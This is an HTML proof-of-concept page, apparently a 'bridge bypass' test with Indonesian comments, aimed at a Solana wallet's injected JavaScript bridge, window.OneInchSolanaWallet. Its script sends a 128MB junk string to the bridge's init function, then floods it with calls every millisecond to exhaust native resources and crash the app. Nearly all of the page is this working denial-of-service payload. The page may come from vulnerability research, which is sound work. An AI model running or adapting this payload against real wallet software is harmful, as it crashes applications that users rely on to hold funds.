<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Bridge Bypass</title>
</head>
<body style="background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px;">

    <div style="border: 2px solid #00ff00; padding: 20px; border-radius: 15px; background: #111;">
        <h2 style="color: #00ff00;">STABILITY TEST V3</h2>
        <p style="font-size: 14px; color: #888;">Target: Solana Bridge Invocation</p>
        
        <button onclick="safeExecute()" style="padding: 20px; background: #00ff00; color: #000; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer;">
            EXECUTE CALL
        </button>

        <p id="status" style="margin-top: 20px; font-size: 12px; color: #aaa;">Status: Ready</p>
    </div>

    <script>
    function safeExecute() {
        const status = document.getElementById('status');
        
        try {
            // MENGGUNAKAN PEMANGGILAN LANGSUNG (Bukan Assignment)
            // Ini untuk menghindari error 'readonly'
            if (window.OneInchSolanaWallet && typeof window.OneInchSolanaWallet.init === 'function') {
                
                status.innerText = "Invoking bridge function...";
                
                // Payload raksasa untuk memicu Resource Exhaustion di sisi native
                const junk = "A".repeat(128 * 1024 * 1024); // 128MB
                
                // HANYA MEMANGGIL, TIDAK MERUBAH PROPERTI
                window.OneInchSolanaWallet.init(junk);

                // Flooding dengan pemanggilan cepat
                setInterval(() => {
                    window.OneInchSolanaWallet.init("flood_" + Math.random());
                }, 1);

                status.innerText = "Call sent. Observe for crash...";
            } else {
                status.innerText = "Error: Bridge method not found.";
            }
        } catch (e) {
            // Menampilkan error secara detail jika masih gagal
            status.innerText = "Execution Log: " + e.message;
            console.error(e);
        }
    }
    </script>
</body>
</html>
